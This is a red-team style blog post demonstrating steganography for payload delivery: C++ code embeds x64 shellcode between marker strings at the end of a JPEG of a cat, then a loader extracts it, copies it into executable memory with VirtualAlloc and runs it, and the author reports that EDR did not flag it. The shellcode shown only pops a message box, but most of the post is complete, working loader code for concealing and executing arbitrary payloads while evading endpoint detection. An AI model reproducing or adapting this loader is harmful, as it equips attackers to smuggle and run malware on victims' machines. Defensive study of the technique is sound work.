---
title:  "Steganography is still relevant!"
header:
  teaser: "/assets/images/stego.png"
categories:
  - Steganography
tags:
  - payload
  - shellcode
  - post-exploitation
  - '2025'
  - g3tsyst3m
---

Hi all!  Today we have a guest on the blog.  Let me introduce you to Phoebe, a hacker extraordinaire who is assisting me in today's steganography lesson.  

![stego2](https://github.com/user-attachments/assets/c7db062f-94c5-4aeb-a918-6762b3d55a8b)

I'm convinced that due to Phoebe's cuteness, she can bypass EDR with ease, all while playing with shellcode.  What do you think?  Have you ever witnessed an EDR solution using cuteness as a rationale for allowing an analyzed file with unusual data to pass through it?  Let's see if we can make it happen!  😺  I'm going to use C++ for our coding language of preference.  Bear in mind, this is a simple demonstration of using steganography to conceal and execute shellcode.  You could easily add more layers of obfuscation and encoding to make this even more innocuous than it already is.

***Code to Hide Shellcode in JPEG image***
-

We will start with the standard headers, setup a beginning marker and ending marker to locate our shellcode in the picture, and our [messagebox shellcode](https://g3tsyst3m.github.io/shellcoding/assembly/debugging/x64-Assembly-and-Shellcoding-101-Part-5/):

```cpp

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>

const std::string BEGIN_MARKER = "phoebe_b";  // Marker for the beginning of shellcode
const std::string END_MARKER = "phoebe_e";      // Marker for the end of shellcode

// The shellcode to embed, specified directly in the code
unsigned char shellcode[] = 
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b\x40\x18\x48\x8b"
"\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48"
"\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d"
"\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4c\x89\xd1\x48\xb8\x64\x64\x72\x65\x73\x73\x90\x90"
"\x48\xc1\xe0\x10\x48\xc1\xe8\x10\x50\x48\xb8\x47\x65\x74\x50\x72\x6f\x63\x41\x50\x48\x89"
"\xe0\x67\xe3\x20\x31\xdb\x41\x8b\x1c\x8b\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c\x39\x0b"
"\x75\xe9\x44\x8b\x48\x08\x44\x39\x4b\x08\x74\x03\x75\xdd\xcc\x51\x41\x5f\x49\xff\xc7\x4d"
"\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x43\x8b\x04\xbb\x4c\x01\xc0\x50\x41\x5f\x4d\x89\xfc"
"\x4c\x89\xc7\x4c\x89\xc1\xb8\x61\x72\x79\x41\x50\x48\xb8\x4c\x6f\x61\x64\x4c\x69\x62\x72"
"\x50\x48\x89\xe2\x48\x83\xec\x30\x41\xff\xd7\x48\x83\xc4\x30\x49\x89\xc7\x4d\x89\xe6\x48"
"\x89\xf9\xb8\x65\x73\x73\x90\xc1\xe0\x08\xc1\xe8\x08\x50\x48\xb8\x45\x78\x69\x74\x50\x72"
"\x6f\x63\x50\x48\x89\xe2\x48\x83\xec\x30\x41\xff\xd6\x48\x83\xc4\x30\x49\x89\xc6\xb8\x6c"
"\x6c\x90\x90\xc1\xe0\x10\xc1\xe8\x10\x50\x48\xb8\x75\x73\x65\x72\x33\x32\x2e\x64\x50\x48"
"\x89\xe1\x48\x83\xec\x30\x41\xff\xd7\x48\x89\xc7\x48\x89\xf9\xb8\x6f\x78\x41\x90\xc1\xe0"
"\x08\xc1\xe8\x08\x50\x48\xb8\x4d\x65\x73\x73\x61\x67\x65\x42\x50\x48\x89\xe2\x48\x83\xec"
"\x30\x41\xff\xd4\x49\x89\xc7\x48\x31\xc9\xb8\x6d\x90\x90\x90\xc1\xe0\x18\xc1\xe8\x18\x50"
"\x48\xb8\x67\x33\x74\x73\x79\x73\x74\x33\x50\x48\x89\xe2\x49\x89\xe0\x45\x31\xc9\x48\x83"
"\xec\x30\x41\xff\xd7\x48\x83\xc4\x30\x31\xc9\x41\xff\xd6";
```

Next, we need a function to open the JPEG image, insert our beginning marker, shellcode, and ending marker and write that to an output JPEG image.

```cpp
// Function to embed shellcode in a JPEG file
bool EmbedShellcodeInJPEG(const std::string& jpegPath, const std::string& outputPath) {
    // Read the JPEG file
    std::ifstream jpegFile(jpegPath, std::ios::binary);
    if (!jpegFile) {
        std::cerr << "Failed to open JPEG file!" << std::endl;
        return false;
    }
    std::vector<unsigned char> jpegData((std::istreambuf_iterator<char>(jpegFile)), std::istreambuf_iterator<char>());
    jpegFile.close();

    // Append the beginning marker
    jpegData.insert(jpegData.end(), BEGIN_MARKER.begin(), BEGIN_MARKER.end());

    // Append the shellcode
    jpegData.insert(jpegData.end(), std::begin(shellcode), std::end(shellcode));

    // Append the ending marker
    jpegData.insert(jpegData.end(), END_MARKER.begin(), END_MARKER.end());

    // Write the modified data to the output file
    std::ofstream outputFile(outputPath, std::ios::binary);
    if (!outputFile) {
        std::cerr << "Failed to open output file!" << std::endl;
        return false;
    }
    outputFile.write(reinterpret_cast<const char*>(jpegData.data()), jpegData.size());
    outputFile.close();

    std::cout << "Shellcode embedded successfully!" << std::endl;
    return true;
}
```

And finally, our `main()` function that calls our `EmbedShellcodeInJPEG()` function and writes the new image, with the shellcode concealed within the image, to a file.

```cpp
int main() {
    std::string jpegFilePath = "c:\\users\\public\\stego.jpg";         // Path to the input JPEG file
    std::string outputFilePath = "c:\\users\\public\\output.jpg";      // Path for the output JPEG with embedded shellcode

    // Embed shellcode in JPEG
    if (!EmbedShellcodeInJPEG(jpegFilePath, outputFilePath)) {
        return 1;
    }

    return 0;
}
```

Go ahead and compile and run the code above.  Now, let's check out the JPEG image we just created.  Here's what the shellcode looks like in ASCII form in the image itself, viewed in Notepad++.  You can see the beginning and ending markers, `phoebe`, as well!  The beginning is the start of our shellcode, and ending marker is the end of our shellcode.  This makes for easy locating of and extracting of our shellcode 😺 

![image](https://github.com/user-attachments/assets/aa2e58b9-ac84-4810-8e1b-bbab07785b4d)

Okay!  So we have the new JPEG image written to disk with shellcode concealed and ready to use.  Let's take a look at it.  Best I can tell, I see a standard JPEG image of a very pretty calico cat.  Nothing out of the ordinary here. 😸

![image](https://github.com/user-attachments/assets/d6ceb6a6-9fc4-43c0-b6e0-0ba085efc8c1)

Next, I'll show you how to extract the shellcode from the image and use it!

***Extracting and Executing the Shellcode from the Image***
-

It's time for the fun part.  Let's put together a function that will locate and extract our shellcode using Phoebe's markers that she helped us setup.   🐱
The function will conclude with writing the extracted shellcode to a `.bin` file.  You could just as easily extract the shellcode from the image and write it directly to memory instead of to disk, but I'm keeping things simple to help you the reader easily digest how this all comes together.  So for now, we will just extract it and write it to `c:\users\public\extracted_shellcode.bin`.  Here's the function code below:

```cpp
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <Windows.h>

const std::string BEGIN_MARKER = "phoebe_b";  // Marker for the beginning of shellcode
const std::string END_MARKER = "phoebe_e";      // Marker for the end of shellcode

// Function to extract the shellcode from the JPEG file
bool ExtractShellcodeFromJPEG(const std::string& jpegPath, const std::string& outputShellcodePath) {
    // Read the JPEG file with embedded shellcode
    std::ifstream jpegFile(jpegPath, std::ios::binary);
    if (!jpegFile) {
        std::cerr << "Failed to open JPEG file!" << std::endl;
        return false;
    }
    std::vector<unsigned char> jpegData((std::istreambuf_iterator<char>(jpegFile)), std::istreambuf_iterator<char>());
    jpegFile.close();

    // Find the markers
    auto beginPos = std::search(jpegData.begin(), jpegData.end(), BEGIN_MARKER.begin(), BEGIN_MARKER.end());
    auto endPos = std::search(jpegData.begin(), jpegData.end(), END_MARKER.begin(), END_MARKER.end());

    if (beginPos == jpegData.end() || endPos == jpegData.end()) {
        std::cerr << "Markers not found in the JPEG file!" << std::endl;
        return false;
    }

    // Extract the shellcode between the markers
    beginPos += BEGIN_MARKER.size();  // Move past the BEGIN_MARKER
    std::vector<unsigned char> shellcodeData(beginPos, endPos);

    // Write the extracted shellcode to a file
    std::ofstream outputFile(outputShellcodePath, std::ios::binary);
    if (!outputFile) {
        std::cerr << "Failed to open output shellcode file!" << std::endl;
        return false;
    }
    outputFile.write(reinterpret_cast<const char*>(shellcodeData.data()), shellcodeData.size());
    outputFile.close();

    std::cout << "Shellcode extracted successfully!" << std::endl;
    return true;
}
```

Next, we need our `main()` function which will call our `ExtractShellcodeFromJPEG()` function, read the shellcode from the `.bin` file, and execute it!  But before we do that, let's look ahead a bit to see what that `.bin` file looks like after it's been created:

![image](https://github.com/user-attachments/assets/38c9e21b-a405-4875-9034-bb5dfff97dfa)

Pretty cool huh?  We successfully extracted our shellcode and what we're looking at here is the ASCII representation of our shellcode.  Quite ugly to look at, but either way, we did it!
Finally, the highly anticipated code that ties it all together.  We will open the `.bin` file, read the shellcode into a `char* buffer`, allocate and write the buffer (shellcode) to memory, and cast the memory address of our buffer to a function pointer and execute it!

```cpp
int main() {
    std::string outputFilePath = "c:\\users\\public\\output.jpg";      // Path for the output JPEG with embedded shellcode
    std::string extractedShellcodePath = "c:\\users\\public\\extracted_shellcode.bin";  // Path for the extracted shellcode

   
    // Extract shellcode from the JPEG
    if (!ExtractShellcodeFromJPEG(outputFilePath, extractedShellcodePath)) {
        return 1;
    }

    // Open the .bin file
    std::ifstream file("c:\\users\\public\\extracted_shellcode.bin", std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Failed to open file!" << std::endl;
        return -1;
    }

    // Get the file size
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    // Allocate memory for the contents of the file
    char* buffer = new char[size];

    // Read the file into the buffer
    if (file.read(buffer, size)) {
        // Allocate executable memory and copy the content there
        void* execMemory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (execMemory == NULL) {
            std::cerr << "Memory allocation failed!" << std::endl;
            delete[] buffer;
            return -1;
        }

        // Copy the binary content to the allocated memory
        memcpy(execMemory, buffer, size);

        // Cast the memory to a function pointer and execute
        typedef void(*Function)();
        Function func = reinterpret_cast<Function>(execMemory);
        func();  // Call the function (execute the binary content)

        // Free memory and resources
        VirtualFree(execMemory, 0, MEM_RELEASE);
    }
    else {
        std::cerr << "Failed to read file!" << std::endl;
        delete[] buffer;
        return -1;
    }

    // Cleanup
    delete[] buffer;

    return 0;
}
```

The result?

![image](https://github.com/user-attachments/assets/d8ccf6fc-8dd9-4b73-884f-abb735a92ba5)

And there you have it folks.  We successfully copied shellcode into an innocuous image, extracted it, and executed it.  Oh, and what about EDR?  Nada

![image](https://github.com/user-attachments/assets/ade3c11c-0195-4daa-9ac7-254a62edfd79)

The hypothesis of the cute picture of Phoebe dissuading the EDR solution from detecting us proved correct!  LOL 😆  As always, full source code for both hiding the shellcode and extracting it from the image can be found at my github repo.  Hope you learned something and take care!


